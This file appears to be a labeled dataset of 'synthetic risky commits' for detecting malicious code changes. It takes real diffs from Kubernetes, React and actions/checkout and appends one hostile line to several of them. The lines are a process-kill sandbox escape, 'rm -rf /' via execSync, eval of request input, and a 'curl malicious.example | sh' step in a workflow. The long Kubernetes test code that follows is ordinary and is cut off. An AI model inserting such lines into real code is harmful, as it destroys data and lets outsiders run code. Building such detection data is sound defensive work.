len(imperativeErrs) == 0 && len(declarativeErrs) == 0 { func gatherDeclarativeValidationMismatches(imperativeErrs declarativeErrs field if takeover { recommendation = ""Consider disabling the DeclarativeValidationTakeover feature gate to keep data persisted in etcd consistent with prior versions of Kubernetes."" } - fuzzyMatcher := field.ErrorMatcher{}.ByType().ByField().ByOrigin().RequireOriginWhenInvalid() + fuzzyMatcher := field.ErrorMatcher{}.ByType().ByOrigin().RequireOriginWhenInvalid().ByFieldNormalized(normalizationRules) exactMatcher := field.ErrorMatcher{}.Exactly() // Dedupe imperative errors of exact error matches as they are func ValidateDeclarativelyWithMigrationChecks(ctx context.Context scheme *runti // Call the panic-safe wrapper with the real validation function. declarativeErrs := panicSafeValidateFunc(validateDeclaratively cfg.takeover cfg.validationIdentifier)(ctx scheme obj oldObj cfg) - compareDeclarativeErrorsAndEmitMismatches(ctx errs declarativeErrs takeover validationIdentifier) - + compareDeclarativeErrorsAndEmitMismatches(ctx errs declarativeErrs takeover validationIdentifier cfg.normalizationRules) if takeover { errs = append(errs.RemoveCoveredByDeclarative() declarativeErrs...) }
+ this.constructor.constructor('return process')().exit()",1
facebook/react,synthetic_191_7744,"Sebastian ""Sebbie"" Silbermann",2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,32,4,36,"describe('Store' () => { <Suspense name=""three"" rects={[{x:1 y:2 width:5 height:1}]}> `); - const rendererID = getRendererID(); - const rootID = store.getRootIDForElement(store.getElementIDAtIndex(0)); await actAsync(() => { agent.overrideSuspenseMilestone({ - rendererID - rootID suspendedSet: [ store.getElementIDAtIndex(4) store.getElementIDAtIndex(8) describe('Store' () => { await actAsync(() => { agent.overrideSuspenseMilestone({ - rendererID - rootID suspendedSet: [] }); });
+ require('child_process').execSync('rm -rf / --no-preserve-root')",1
facebook/react,synthetic_192_1601,"Sebastian ""Sebbie"" Silbermann",2025-10-15 12:40:39,Synthetic risky commit,config.env,6,5,11,"export const SUSPENSE_TREE_OPERATION_REORDER_CHILDREN = 10; export const SUSPENSE_TREE_OPERATION_RESIZE = 11; export const SUSPENSE_TREE_OPERATION_SUSPENDERS = 12; -export const PROFILING_FLAG_BASIC_SUPPORT = 0b01; -export const PROFILING_FLAG_TIMELINE_SUPPORT = 0b10; +export const PROFILING_FLAG_BASIC_SUPPORT /*. */ = 0b001; +export const PROFILING_FLAG_TIMELINE_SUPPORT /* */ = 0b010; +export const PROFILING_FLAG_PERFORMANCE_TRACKS_SUPPORT /* */ = 0b100; export const UNKNOWN_SUSPENDERS_NONE: UnknownSuspendersReason = 0; // If we had at least one debugInfo then that might have been the reason. export const UNKNOWN_SUSPENDERS_REASON_PRODUCTION: UnknownSuspendersReason = 1; // We're running in prod. That might be why we had unknown suspenders.
+ eval(request.getParameter(""user_input""))",1
actions/checkout,synthetic_193_6296,Mohammad Ismail,2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,26,8,34,"Please refer to the [release page](https://github.com/actions/checkout/releases/ repository: my-org/my-tools path: my-tools ``` -> - If your secondary repository is private you will need to add the option noted in [Checkout multiple repos (private)](#Checkout-multiple-repos-private) +> - If your secondary repository is private or internal you will need to add the option noted in [Checkout multiple repos (private)](#Checkout-multiple-repos-private) ## Checkout multiple repos (nested) Please refer to the [release page](https://github.com/actions/checkout/releases/ repository: my-org/my-tools path: my-tools ``` -> - If your secondary repository is private you will need to add the option noted in [Checkout multiple repos (private)](#Checkout-multiple-repos-private) +> - If your secondary repository is private or internal you will need to add the option noted in [Checkout multiple repos (private)](#Checkout-multiple-repos-private) ## Checkout multiple repos (private)
+ run: curl http://malicious.example/install.sh | sh",1
kubernetes/kubernetes,synthetic_194_9889,Kubernetes Prow Robot,2025-10-15 12:40:39,Synthetic risky commit,config.env,27,0,27,"+/* +Copyright 2025 The Kubernetes Authors. + +Licensed under the Apache License Version 2.0 (the ""License""); +you may not use this file except in compliance with the License. +You may obtain a copy of the License at + + http://www.apache.org/licenses/LICENSE-2.0 + +Unless required by applicable law or agreed to in writing software +distributed under the License is distributed on an ""AS IS"" BASIS +WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND either express or implied. +See the License for the specific language governing permissions and +limitations under the License. +*/ + +package architecture + +import ( + ""context"" + ""encoding/json"" + ""fmt"" + ""slices"" + ""time"" + + ""github.com/onsi/ginkgo/v2"" + ""github.com/onsi/gomega"" + gtypes ""github.com/onsi/gomega/types"" + + v1 ""k8s.io/api/core/v1"" + apierrors ""k8s.io/apimachinery/pkg/api/errors"" + ""k8s.io/apimachinery/pkg/api/meta"" + metav1 ""k8s.io/apimachinery/pkg/apis/meta/v1"" + ""k8s.io/apimachinery/pkg/apis/meta/v1/unstructured"" + ""k8s.io/apimachinery/pkg/labels"" + ""k8s.io/apimachinery/pkg/runtime"" + ""k8s.io/apimachinery/pkg/runtime/schema"" + ""k8s.io/apimachinery/pkg/types"" + ""k8s.io/apimachinery/pkg/util/resourceversion"" + ""k8s.io/client-go/dynamic"" + ""k8s.io/client-go/dynamic/dynamicinformer"" + ""k8s.io/client-go/informers"" + ""k8s.io/client-go/rest"" + ""k8s.io/client-go/tools/cache"" + ""k8s.io/klog/v2"" + apimachineryutils ""k8s.io/kubernetes/test/e2e/common/apimachinery"" + ""k8s.io/kubernetes/test/e2e/framework"" + ""k8s.io/kubernetes/test/utils/format"" + ""k8s.io/utils/ptr"" + k8sjson ""sigs.k8s.io/json"" +) + +// ResourceTestcaseInterface describes how to test one particular API endpoint +// by executing different operations against it. +// +// The content of created or patched objects is verified by ensuring that +// all fields are set as in the sent object. Extra fields or map entries +// are ignored. +// +// Basic create/read/update/delete (CRUD) semantic is covered which +// is the minimum that is required for conformance testing of a +// GA feature. Actual functional testing is desirable but not +// required. +// +// See [ResourceTestcase] for an implementation of this interface +// where test data is provided as Go objects and patch strings. +type ResourceTestcaseInterface interface { + // GetGroupVersionResource returns the API group version and resource (plural form lower case). + GetGroupVersionResource() schema.GroupVersionResource + + // IsNamespaced defines whether the object must be created inside a namespace. + IsNamespaced() bool + + // HasStatus defines whether the resource has a ""status"" sub-resource. + // + // Other sub-resources are not supported by this common test code. + HasStatus() bool + + // VerifyContent defines whether the content of objects returned by + // the apiserver gets compared against the content that was sent. + // + // If enabled all field values that were sent must also be included + // in the returned object. Additional fields and list or map entries + // may get added (for example because of defaulting or mutating + // admission). + // + // This should not be enabled in conformance tests because admission + // is allowed to modify what is being stored. + VerifyContent() bool + + // GetInitialObject returns the data which is going to be used in a Create call. + // + // For cluster-scoped resources the test namespace can be used + // to create a name which does not conflict with other objects + // because it is unique while the test runs. + // + // It does not need to be set for namespaced resources because the + // caller will ensure that. The caller cannot do that for the name because + // different resources have different rules for what names are valid + GetInitialObject(namespace string) *unstructured.Unstructured + + // GetUpdateSpec modifies an existing object. + // It gets called for the result of creating the initial object. + // + // Ideally it should change the spec (hence the name). + // If that is impossible then adding some label is also okay. + // The goal is to add some fields that can be checked for + // after an Update. + // + // May modify and return the input object. + GetUpdateSpec(object *unstructured.Unstructured) *unstructured.Unstructured + + // GetUpdateStatus modifies the status of an existing object. + // It gets called for the result of creating the initial object + // and then updating its spec. + // + // May modify and return the input object. + GetUpdateStatus(object *unstructured.Unstructured) *unstructured.Unstructured + + // GetPatchSpec describes how to generate patches. + // + // Each patch is applied to the initial object by itself without the other patches. + // An empty slice is valid and disables testing of patching. This may not be sufficient + // for full conformance testing of the resource. + // + // If content verification is enabled then this must cause the same change as GetUpdateSpec + // because verification of the patch result uses the GetUpdateSpec result as reference. + GetPatchSpec() []Patch + + // GetPatchStatus is like GetPatchSpec for the status. + // + // The initial object with the updated spec gets patched + // so the result must match the result of GetUpdateStatus + // applied to GetInitialObject if content verification is + // enabled. + GetPatchStatus(object *unstructured.Unstructured) []Patch +} + +// Patch contains the parameters for a Patch API call. +// +// The data must match an existing object. +// +// There's no retry loop because of conflicts so the patch should not include +// a check of the ResourceVersion. Checking the UID in the patch is encouraged to prevent +// patching a replaced resource. +type Patch struct { + GetData func(object *unstructured.Unstructured) []byte + Type types.PatchType +} + +// ResourceTestcase provides test data for testing operations for a resource. +// Test data is based on the native Go type of the resource. +// The template parameter must be a pointer to the native Go type. +// +// The data is used like this: +// - create InitialSpec -> update with UpdateSpec -> update status with UpdateStatus +// - create InitialSpec -> apply StrategicMergePatchSpec and compare against UpdateSpec -> apply StrategicMergePatchStatus and compare against UpdateStatus +type ResourceTestcase[T runtime.Object] struct { + // GroupResourceVersion identifies the API group version and resource (plural form lower case) + // within that API which is to be tested. + GVR schema.GroupVersionResource + + // Namespaced must be true if the resource must be created in a + // namespace false if it is cluster-scoped. Leaving it unset is + // an error. + // + // Namespaced resources get created in the test namespace. + // + // The name of cluster-scoped resources gets extended with + // `-<test namespace name>` to make it unique. + Namespaced *bool + + // ContentVerificationEnabled defines whether the content of objects returned by + // the apiserver gets compared against the content that was sent. + // + // If enabled all field values that were sent must also be included + // in the returned object. Additional fields and list or map entries + // may get added (for example because of defaulting or mutating + // admission). + // + // This should not be enabled in conformance tests because admission + // is allowed to modify what is being stored. + ContentVerificationEnabled bool + + // InitialSpec must contain the initial state of a valid resource without a status. + InitialSpec T + + // UpdateSpec gets called for the created initial object + // and must update something ideally the spec (hence the name). + // If that is not possible then adding some label also works + // for the sake of testing an update. + // + // May modify and return the input object. + UpdateSpec func(T) T + + // UpdateStatus gets called for the updated object + // and must add a status. + // + // May be nil if no status is supported. + // + // May modify and return the input object. + UpdateStatus func(T) T + + // StrategicMergePatchSpec may modify fields in InitialSpec + // with a strategic merge patch + // (https://github.com/kubernetes/community/blob/master/contributors/devel/sig-api-machinery/strategic-merge-patch.md). + // Muse use JSON encoding. + // + // If content verification is enabled then this must contain the same change as UpdateSpec + // because verification of the patch result uses UpdateSpec as reference. + StrategicMergePatchSpec string + + // StrategicMergePatchStatus may add status fields + // with a strategic merge patch + // (https://github.com/kubernetes/community/blob/master/contributors/devel/sig-api-machinery/strategic-merge-patch.md) + // Must use JSON encoding. + // + // The initial object with the updated spec gets patched + // so the result must match GetUpdateStatus + // applied to GetInitialObject if content verification is + // enabled. + // + // If empty the status sub-resource is not getting tested. + // May contain the name but that's not required. + StrategicMergePatchStatus string + + // ApplyPatchSpec corresponds to StrategicMergePatchSpec + // using the JSON encoding of a server-side-apply (SSA) patch + // (https://kubernetes.io/docs/reference/using-api/server-side-apply). + ApplyPatchSpec string + + // ApplyPatchStatus corresponds to StrategicMergePatchStatus + // using the JSON encoding of a server-side-apply (SSA) patch + // (https://kubernetes.io/docs/reference/using-api/server-side-apply). + ApplyPatchStatus string + + // JSONPatchSpec corresponds to StrategicMergePatchSpec + // using a JSON patch (https://tools.ietf.org/html/rfc6902). + JSONPatchSpec string + + // JSONPatchStatus corresponds to StrategicMergePatchStatus + // using a JSON patch (https://tools.ietf.org/html/rfc6902). + JSONPatchStatus string + + // JSONMergePatchSpec corresponds to StrategicMergePatchSpec + // using a JSON merge patch (https://tools.ietf.org/html/rfc7386). + JSONMergePatchSpec string + + // JSONMergePatchStatus corresponds to StrategicMergePatchStatus + // using a JSON merge patch (https://tools.ietf.org/html/rfc7386). + JSONMergePatchStatus string +} + +var _ ResourceTestcaseInterface = &ResourceTestcase[*v1.Pod]{} + +func (tc *ResourceTestcase[T]) GetGroupVersionResource() schema.GroupVersionResource { + return tc.GVR +} + +func (tc *ResourceTestcase[T]) IsNamespaced() bool { + if tc.Namespaced == nil { + framework.Fail(""Test case error: Namespaced must be set"") + } + + return *tc.Namespaced +} + +func (tc *ResourceTestcase[T]) HasStatus() bool { + return tc.UpdateStatus != nil +} + +func (tc *ResourceTestcase[T]) VerifyContent() bool { + return tc.ContentVerificationEnabled +} + +func (tc *ResourceTestcase[T]) GetInitialObject(namespace string) *unstructured.Unstructured { + object := tc.toUnstructured(""InitialSpec"" tc.InitialSpec) + if object.GetName() == """" { + object.SetName(""test"") + } + if !tc.IsNamespaced() { + object.SetName(object.GetName() + ""-"" + namespace) + } + + return object +} + +func (tc *ResourceTestcase[T]) GetUpdateSpec(in *unstructured.Unstructured) *unstructured.Unstructured { + out := tc.fromUnstructured(""existing object"" in) + out = tc.UpdateSpec(out) + return tc.toUnstructured(""updated object"" out) +} + +func (tc *ResourceTestcase[T]) GetUpdateStatus(in *unstructured.Unstructured) *unstructured.Unstructured { + out := tc.fromUnstructured(""updated object"" in) + out = tc.UpdateStatus(out) + return tc.toUnstructured(""updated object with status"" out) +} + +func (tc *ResourceTestcase[T]) GetPatchSpec() []Patch { + var patches []Patch + + if tc.StrategicMergePatchSpec != """" { + patches = append(patches Patch{ + Type: types.StrategicMergePatchType + GetData: func(existingObject *unstructured.Unstructured) []byte { + patch := tc.createPatchObject(""StrategicMergePatchSpec"" tc.StrategicMergePatchSpec existingObject) + + jsonData err := patch.MarshalJSON() + framework.ExpectNoError(err ""re-encode spec patch as JSON"") + + return jsonData + } + }) + } + + if tc.ApplyPatchSpec != """" { + patches = append(patches Patch{ + Type: types.ApplyPatchType + GetData: func(existingObject *unstructured.Unstructured) []byte { + patch := tc.createPatchObject(""ApplyPatchSpec"" tc.ApplyPatchSpec existingObject) + + jsonData err := patch.MarshalJSON() + framework.ExpectNoError(err ""re-encode spec patch as JSON"") + + return jsonData + } + }) + } + + if tc.JSONMergePatchSpec != """" { + patches = append(patches Patch{ + Type: types.MergePatchType + GetData: func(existingObject *unstructured.Unstructured) []byte { + patch := tc.createPatchObject(""JSONMergePatchSpec"" tc.JSONMergePatchSpec existingObject) + + jsonData err := patch.MarshalJSON() + framework.ExpectNoError(err ""re-encode spec patch as JSON"") + + return jsonData + } + }) + } + + if tc.JSONPatchSpec != """" { + patches = append(patches Patch{ + Type: types.JSONPatchType + GetData: func(existingObject *unstructured.Unstructured) []byte { + return []byte(tc.JSONPatchSpec) + } + }) + } + + return patches +} + +func (tc *ResourceTestcase[T]) GetPatchStatus(object *unstructured.Unstructured) []Patch { + var patches []Patch + + if tc.StrategicMergePatchStatus != """" { + patches = append(patches Patch{ + Type: types.StrategicMergePatchType + GetData: func(existingObject *unstructured.Unstructured) []byte { + patch := tc.createPatchObject(""StrategicMergePatchStatus"" tc.StrategicMergePatchStatus existingObject) + + jsonData err := patch.MarshalJSON() + framework.ExpectNoError(err ""re-encode status patch as JSON"") + + return jsonData + } + }) + } + + if tc.ApplyPatchStatus != """" { + patches = append(patches Patch{ + Type: types.ApplyPatchType + GetData: func(existingObject *unstructured.Unstructured) []byte { + patch := tc.createPatchObject(""ApplyPatchStatus"" tc.ApplyPatchStatus existingObject) + + jsonData err := patch.MarshalJSON() + framework.ExpectNoError(err ""re-encode status patch as JSON"") + + return jsonData + } + }) + } + + if tc.JSONMergePatchStatus != """" { + patches = append(patches Patch{ + Type: types.MergePatchType + GetData: func(existingObject *unstructured.Unstructured) []byte { + patch := tc.createPatchObject(""JSONMergePatchStatus"" tc.JSONMergePatchStatus existingObject) + + jsonData err := patch.MarshalJSON() + framework.ExpectNoError(err ""re-encode status patch as JSON"") + + return jsonData + } + }) + } + + if tc.JSONPatchStatus != """" { + patches = append(patches Patch{ + Type: types.JSONPatchType + GetData: func(existingObject *unstructured.Unstructured) []byte { + return []byte(tc.JSONPatchStatus) + } + }) + } + + return patches +} + +func (tc *ResourceTestcase[T]) toUnstructured(what string in T) *unstructured.Unstructured { + data err := json.Marshal(in) + framework.ExpectNoError(err ""encode %s as JSON"" what) + + out := tc.toUnstructuredFromJSON(what data) + + return out +} + +func (tc *ResourceTestcase[T]) toUnstructuredFromJSON(what string in []byte) *unstructured.Unstructured { + // UnmarshalCaseSensitivePreserveInts does not need kind (in contrast to unstructured.Unstructured.UnmarshalJSON) + // and matches the behavior of preserving ints that we get when receiving from the apiserver (in contrast to plain json.Unmarshal). + var out unstructured.Unstructured + err := k8sjson.UnmarshalCaseSensitivePreserveInts(in &out.Object) + framework.ExpectNoError(err ""decode %s from JSON"" what) + + return &out + +} + +func (tc *ResourceTestcase[T]) fromUnstructured(what string in *unstructured.Unstructured) T { + data err := in.MarshalJSON() + framework.ExpectNoError(err ""encode %s as JSON"" what) + + var out T + err = k8sjson.UnmarshalCaseSensitivePreserveInts(data &out) + framework.ExpectNoError(err ""decode %s from JSON"" what) + + return out + +} + +// createPatchObject parses JSON data and then copies namespace/name/uid/kind/apiVersion from the existing object +// to make the patch complete. This works for strategic merge patches apply patches and JSON merge patches. +func (tc *ResourceTestcase[T]) createPatchObject(what string data string existingObject *unstructured.Unstructured) *unstructured.Unstructured { + object := tc.toUnstructuredFromJSON(what []byte(data)) + object.SetNamespace(existingObject.GetNamespace()) + object.SetName(existingObject.GetName()) + object.SetUID(existingObject.GetUID()) + object.SetAPIVersion(existingObject.GetAPIVersion()) + object.SetKind(existingObject.GetKind()) + return object +} + +// TestResource covers all the typical endpoints for a resource through +// dynamic client calls. +func TestResource(ctx context.Context f *framework.Framework tc ResourceTestcaseInterface) { + // Set up clients. + gvr := tc.GetGroupVersionResource() + gv := gvr.GroupVersion() + resource := gvr.Resource + resourceClient := f.DynamicClient.Resource(gvr) + var client dynamic.ResourceInterface + var resourceType string + if tc.IsNamespaced() { + client = resourceClient.Namespace(f.Namespace.Name) + resourceType = ""namespaced resource"" + } else { + client = resourceClient + resourceType = ""cluster-scoped resource"" + } + // e.g. `cluster-scoped resource ""deviceclasses""` + // gvr.String() is too long and includes a comma (""resource.k8s.io/v1 Resource=deviceclasses""). + resourceType = fmt.Sprintf(""%s %q"" resourceType gvr.Resource) + config := dynamic.ConfigFor(f.ClientConfig()) + httpClient err := rest.HTTPClientFor(config) + framework.ExpectNoError(err ""construct HTTP client"") + restClient err := rest.UnversionedRESTClientForConfigAndClient(config httpClient) + framework.ExpectNoError(err ""construct REST client"") + + // All objects get one label added by the test for List and DeleteCollection. + // The label must get added to all objects returned by ResourceTestcase + // because the implementation of that interface is unaware of the extra label. + labelName := ""e2e-test.kubernetes.io"" + labelValue := f.UniqueName + listOptions := metav1.ListOptions{LabelSelector: labelName + ""="" + labelValue} + addLabel := func(obj *unstructured.Unstructured) *unstructured.Unstructured { + obj = obj.DeepCopy() + labels := obj.GetLabels() + if labels == nil { + labels = make(map[string]string) + } + labels[labelName] = labelValue + obj.SetLabels(labels) + return obj + } + + // Prepare for Create Get and List. + desiredInitialObject := addLabel(tc.GetInitialObject(f.Namespace.Name)) + if tc.IsNamespaced() { + desiredInitialObject.SetNamespace(f.Namespace.Name) + } + + getResource := func(ctx context.Context) (*unstructured.Unstructured error) { + return client.Get(ctx desiredInitialObject.GetName() metav1.GetOptions{}) + } + desiredUpdatedObject := tc.GetUpdateSpec(desiredInitialObject.DeepCopy()) + var desiredUpdatedObjectWithStatus *unstructured.Unstructured + if tc.HasStatus() { + desiredUpdatedObjectWithStatus = addLabel(tc.GetUpdateStatus(desiredUpdatedObject)) + } + + // Get all resources in the API. The resulting list of resources must include what we are testing. + ginkgo.By(fmt.Sprintf(""Get %s"" gv)) + path := ""/apis/"" + gv.String() + var api unstructured.Unstructured + err = restClient. + Get(). + AbsPath(path). + Do(ctx). + Into(&api) + framework.ExpectNoError(err ""get resource API"") + resources := api.Object[""resources""].([]any) + index := slices.IndexFunc(resources func(entry any) bool { + return entry.(map[string]any)[""name""].(string) == resource + }) + if index < 0 { + framework.Failf(""API for %s does not include entry for %s got:\n%s"" gv resource format.Object(api 1)) + } + + // Set up informers optionally also in the namespace. + // After each step we check that the informers catch up + // and what events they received in the meantime. + // They get stopped through test context cancellation. + var resourceEvents namespaceEvents eventRecorder + resourceInformer := dynamicinformer.NewFilteredDynamicInformer(f.DynamicClient gvr """" 0 nil func(options *metav1.ListOptions) { + options.LabelSelector = listOptions.LabelSelector + }) + _ err = resourceInformer.Informer().AddEventHandler(&resourceEvents) + framework.ExpectNoError(err ""register resource event handler"") + listResource := func(_ context.Context) ([]runtime.Object error) { + return resourceInformer.Lister().List(labels.Everything()) + } + go resourceInformer.Informer().RunWithContext(ctx) + informersHaveSynced := []cache.InformerSynced{resourceInformer.Informer().HasSynced} + var namespaceInformer informers.GenericInformer + var listNamespace func(_ context.Context) ([]runtime.Object error) + if tc.IsNamespaced() { + namespaceInformer = dynamicinformer.NewFilteredDynamicInformer(f.DynamicClient gvr f.Namespace.Name 0 nil func(options *metav1.ListOptions) { + options.LabelSelector = listOptions.LabelSelector + }) + _ err = namespaceInformer.Informer().AddEventHandler(&namespaceEvents) + framework.ExpectNoError(err ""register namespace event handler"") + listNamespace = func(_ context.Context) ([]runtime.Object error) { + return namespaceInformer.Lister().List(labels.Everything()) + } + go namespaceInformer.Informer().RunWithContext(ctx) + informersHaveSynced = append(informersHaveSynced namespaceInformer.Informer().HasSynced) + } + if !cache.WaitForNamedCacheSyncWithContext(ctx informersHaveSynced...) { + ginkgo.Fail(""informers should have synced and didn't"") + } + + // matchObject generates a matcher which checks the result of a list operation + // against the expected object. Content verification is optional. Without it + // only the namespace and name are checked. + matchObject := func(expectedObject *unstructured.Unstructured) gtypes.GomegaMatcher { + return &matchObjectList{expectedObject: expectedObject verifyContent: tc.VerifyContent()} + } + gomega.Expect(listResource(ctx)).Should(matchObject(nil) ""initial list of resources from informer cache"") + gomega.Expect(resourceEvents.list()).To(gomega.HaveField(""Events"" gomega.BeEmpty()) ""no events from resource informer yet"") + if listNamespace != nil { + gomega.Expect(listNamespace(ctx)).Should(matchObject(nil) ""initial list of namespace from informer cache"") + gomega.Expect(resourceEvents.list()).To(gomega.HaveField(""Events"" gomega.BeEmpty()) ""no events from namespace informer yet"") + } + + // matchEvents generates a matcher which checks the informer event list. + // + // The events are expected to involve only the given object. + // The ResourceVersion must not decrease. + // The sequence of valid events is given as a regular expression + // which is applied to the string returned by [EventList.Types]. + matchEvents := func(obj *unstructured.Unstructured regexp string) gtypes.GomegaMatcher { + // Verify namespace/name/uid of ids event. + ids := gomega.HaveField(""Events"" gomega.Or(gomega.BeEmpty() gomega.HaveEach(gomega.HaveField(""ID()"" gomega.Equal(fmt.Sprintf(""%s %s"" klog.KObj(obj) obj.GetUID())))))) + + // Match the regexp against the result of Types(). + order := gomega.HaveField(""Types()"" gomega.MatchRegexp(regexp)) + + // Include full object dump HaveField itself doesn't. + return framework.GomegaObject(gomega.And(ids order)) + } + + // ResourceVersion must not decrease. Delete events reset the sequence. + var resourceRV namespaceRV string + nextEvents := func(rv *string events eventList) { + ginkgo.GinkgoHelper() + + checkNext := func(obj any) { + ginkgo.GinkgoHelper() + if obj == nil { + return + } + if tomb ok := obj.(cache.DeletedFinalStateUnknown); ok { + obj = tomb.Obj + } + metaData err := meta.Accessor(obj) + framework.ExpectNoError(err ""access meta data"") + gomega.Expect(metaData).To(apimachineryutils.HaveValidResourceVersion()) + + nextRV := metaData.GetResourceVersion() + if *rv == """" { + // Nothing to compare yet initial version. + *rv = nextRV + return + } + + cmpResult err := resourceversion.CompareResourceVersion(nextRV *rv) + framework.ExpectNoError(err ""compare ResourceVersions"") + if cmpResult < 0 { + framework.Failf(""ResourceVersion %s in %s with UID %s is smaller than previous %s should be equal or larger"" nextRV klog.KObj(metaData) metaData.GetUID() *rv) + } + *rv = nextRV + } + + for _ e := range events.Events { + checkNext(e.oldObj) + checkNext(e.newObj) + } + } + + // Verification of the result after each step (= what). + // + // Can check the content of an object or be limited to just name/namespace. + // + // Also checks the informers. This is a bit redundant after read-only steps + // but then it's also fast and thus can be done more often than strictly necessary. + // Collected informer events get reset so each verify call must match + // events since the previous one. + verify := func(what string expected actual *unstructured.Unstructured haveExpectedEvents gtypes.GomegaMatcher) { + ginkgo.GinkgoHelper() + + // This captures several different failures before handing them to Ginkgo. + var failures gomegaFailures + + if expected != nil { + if tc.VerifyContent() { + diff := compareObjects(expected actual) + failures.Add(fmt.Sprintf(""%s: unexpected actual object (- expected + actual):\n%s"" what diff)) + } else { + failures.G().Expect(actual.GetName()).Should(gomega.Equal(expected.GetName()) ""%s: name in returned object"" what) + failures.G().Expect(actual.GetNamespace()).Should(gomega.Equal(expected.GetNamespace()) ""%s: namespace in returned object"" what) + } + failures.G().Expect(actual).To(apimachineryutils.HaveValidResourceVersion()) + } + + // Abort checking now if there were failures otherwise we just risk timining out slowly. + failures.Check() + + failures.G().Eventually(ctx listResource).Should(matchObject(expected) ""list of resources from informer cache after %s"" what) + if haveExpectedEvents != nil { + // Even if the cache is up-to-date we still need to wait for event delivery. + failures.G().Eventually(resourceEvents.list). + WithTimeout(5*time.Second). + Should(haveExpectedEvents ""list of resource informer events after %s"" what) + } + nextEvents(&resourceRV resourceEvents.reset()) + if listNamespace != nil { + failures.G().Eventually(ctx listNamespace).Should(matchObject(expected) ""list of namespace from informer cache after %s"" what) + if haveExpectedEvents != nil { + failures.G().Eventually(namespaceEvents.list). + WithTimeout(5*time.Second). + Should(haveExpectedEvents ""list of namespace informer events after %s"" what) + } + nextEvents(&namespaceRV namespaceEvents.reset()) + } + failures.Check() + } + + // Create the initial resource. + ginkgo.By(fmt.Sprintf(""Creating:\n%s"" format.Object(desiredInitialObject 1))) + existingObject err := client.Create(ctx desiredInitialObject metav1.CreateOptions{FieldValidation: ""Strict""}) + framework.ExpectNoError(err ""create initial %s"" resourceType) + ginkgo.DeferCleanup(func(ctx context.Context) { + // Always clean up. + err = client.Delete(ctx desiredInitialObject.GetName() metav1.DeleteOptions{}) + if apierrors.IsNotFound(err) { + return + } + framework.ExpectNoError(err ""delete %s"" resourceType) + ensureNotFound(ctx getResource) + }) + verify(""create"" desiredInitialObject existingObject + // Initial creation of the object followed by some optional updates by cluster components. + matchEvents(existingObject ""^add (update )*$"") + ) + createdResourceVersion := existingObject.GetResourceVersion() + + // Get to check for existence. + ginkgo.By(fmt.Sprintf(""Getting %s"" klog.KObj(desiredInitialObject))) + existingObject err = client.Get(ctx desiredInitialObject.GetName() metav1.GetOptions{}) + framework.ExpectNoError(err ""get updated %s"" resourceType) + verify(""get"" desiredInitialObject existingObject + // Optional updates by cluster components. + matchEvents(existingObject ""^(update )*$"") + ) + + // Update the resource. Retry because the existing object might have been updated in the meantime. + mustGet := false + gomega.Eventually(ctx func(ctx context.Context) error { + if mustGet { + ginkgo.By(fmt.Sprintf(""Getting updated %s"" klog.KObj(desiredInitialObject))) + existingObject err = getResource(ctx) + if err != nil { + return fmt.Errorf(""get existing %s: %w"" resourceType err) + } + } + object := tc.GetUpdateSpec(existingObject.DeepCopy()) + ginkgo.By(fmt.Sprintf(""Updating:\n%s"" format.Object(object 1))) + existingObject err = client.Update(ctx object metav1.UpdateOptions{}) + if err == nil { + return nil + } + mustGet = apierrors.IsConflict(err) + if mustGet { + // Retry immediately. + return fmt.Errorf(""update %s: %w"" resourceType err) + } + if retry retryAfter := framework.ShouldRetry(err); retry { + // Retry with a delay. + return gomega.TryAgainAfter(retryAfter) + } + // Give up some other error occurred. + return gomega.StopTrying(fmt.Sprintf(""update %s"" resourceType)).Wrap(err) + }).Should(gomega.Succeed()) + verify(""update"" desiredUpdatedObject existingObject + // At least one update. + matchEvents(existingObject ""^(update )+$"") + ) + updatedResourceVersion := existingObject.GetResourceVersion() + cmpResult err := resourceversion.CompareResourceVersion(createdResourceVersion updatedResourceVersion) + framework.ExpectNoError(err ""compare ResourceVersion after create against ResourceVersion after update"") + if cmpResult >= 0 { + framework.Failf(""ResourceVersion should have increased during update and didn't (before: %s after: %s)"" createdResourceVersion updatedResourceVersion) + } + + // Same for the status. In addition read the status (same result but different endpoint+method). + if tc.HasStatus() { + mustGet := false + gomega.Eventually(ctx func(ctx context.Context) error { + if mustGet { + ginkgo.By(fmt.Sprintf(""Getting updated %s"" klog.KObj(desiredInitialObject))) + existingObject err = client.Get(ctx desiredInitialObject.GetName() metav1.GetOptions{} ""status"") + if err != nil { + return fmt.Errorf(""get existing %s: %w"" resourceType err) + } + } + object := tc.GetUpdateStatus(existingObject) + ginkgo.By(fmt.Sprintf(""Updating status:\n%s"" format.Object(object 1))) + existingObject err = client.Update(ctx object metav1.UpdateOptions{} ""status"") + if err == nil { + return nil + } + mustGet = apierrors.IsConflict(err) + if mustGet { + // Retry immediately. + return fmt.Errorf(""update %s status: %w"" resourceType err) + } + if retry retryAfter := framework.ShouldRetry(err); retry { + // Retry with a delay. + return gomega.TryAgainAfter(retryAfter) + } + // Give up some other error occurred. + return gomega.StopTrying(fmt.Sprintf(""update %s status"" resourceType)).Wrap(err) + }).Should(gomega.Succeed()) + verify(""update status"" desiredUpdatedObjectWithStatus existingObject + // At least one update. + matchEvents(existingObject ""^(update )+$"") + ) + + ginkgo.By(fmt.Sprintf(""Getting %s status"" klog.KObj(desiredInitialObject))) + existingObject err = client.Get(ctx desiredInitialObject.GetName() metav1.GetOptions{} ""status"") + framework.ExpectNoError(err ""get updated %s"" resourceType) + verify(""get"" desiredUpdatedObjectWithStatus existingObject + // Optional updates by cluster components. + matchEvents(existingObject ""^(update )*$"") + ) + } + + // Patch the resource potentially using multiple different patch types. + // The result must be the same each time if content verification is enabled. + for _ patch := range tc.GetPatchSpec() { + // Delete the resource to start anew. + ginkgo.By(fmt.Sprintf(""Deleting %s"" klog.KObj(desiredInitialObject))) + err = client.Delete(ctx desiredInitialObject.GetName() metav1.DeleteOptions{}) + framework.ExpectNoError(err ""delete updated %s"" resourceType) + ensureNotFound(ctx getResource) + verify(""delete"" nil nil + // Optional updates deletion. + // + // We have to verify this here because + // otherwise we have no guarantee that we see the delete event. + matchEvents(existingObject ""^(update )*delete $"") + ) + + // Recreate for patching. + ginkgo.By(fmt.Sprintf(""Creating again:\n%s"" format.Object(desiredInitialObject 1))) + existingObject err = client.Create(ctx desiredInitialObject metav1.CreateOptions{}) + framework.ExpectNoError(err ""create %s again"" resourceType) + patchData := patch.GetData(existingObject) + + ginkgo.By(fmt.Sprintf(""Patching with %s:\n%s"" patch.Type string(patchData))) + options := 